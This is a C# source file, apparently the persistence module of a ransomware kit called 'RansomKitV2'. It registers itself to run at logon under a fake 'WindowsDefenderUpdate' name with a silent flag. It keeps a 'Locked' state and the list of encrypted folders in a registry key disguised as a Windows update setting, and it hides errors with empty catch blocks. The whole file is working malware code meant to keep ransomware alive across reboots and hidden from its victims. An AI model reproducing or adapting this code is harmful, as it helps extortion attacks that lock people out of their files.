using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace RansomKitV2
{
    public static class Persistence
    {
        private const string REG_RUN = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string APP_NAME = "WindowsDefenderUpdate";
        private const string REG_STATE = @"Software\Microsoft\Windows\CurrentVersion\WinUpdate";
        private const string STATE_VAL = "Locked";
        private const string PATHS_VAL = "EncryptedPaths";

        public static void Enable()
        {
            try
            {
                string exePath = Application.ExecutablePath;
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REG_RUN, true))
                {
                    if (key != null)
                        key.SetValue(APP_NAME, "\"" + exePath + "\" --silent");
                }

                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(REG_STATE))
                {
                    if (key != null)
                        key.SetValue(STATE_VAL, 1, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        public static void Disable()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REG_RUN, true))
                {
                    if (key != null)
                        key.DeleteValue(APP_NAME, false);
                }

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REG_STATE, true))
                {
                    if (key != null)
                    {
                        key.SetValue(STATE_VAL, 0, RegistryValueKind.DWord);
                        key.DeleteValue(PATHS_VAL, false); // Clear saved paths
                    }
                }
            }
            catch { }
        }

        public static bool IsLocked()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REG_STATE))
                {
                    if (key != null)
                    {
                        object val = key.GetValue(STATE_VAL);
                        if (val != null && (int)val == 1) return true;
                    }
                }
            }
            catch { }
            return false;
        }

        // NEW: Save the folders the user selected
        public static void SavePaths(List<string> paths)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(REG_STATE))
                {
                    if (key != null)
                    {
                        string combined = string.Join("|", paths);
                        key.SetValue(PATHS_VAL, combined, RegistryValueKind.String);
                    }
                }
            }
            catch { }
        }

        // NEW: Load the folders when the app restarts
        public static List<string> LoadPaths()
        {
            List<string> paths = new List<string>();
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REG_STATE))
                {
                    if (key != null)
                    {
                        object val = key.GetValue(PATHS_VAL);
                        if (val != null)
                        {
                            string combined = val.ToString();
                            if (!string.IsNullOrEmpty(combined))
                            {
                                paths.AddRange(combined.Split('|'));
                            }
                        }
                    }
                }
            }
            catch { }
            return paths;
        }
    }
}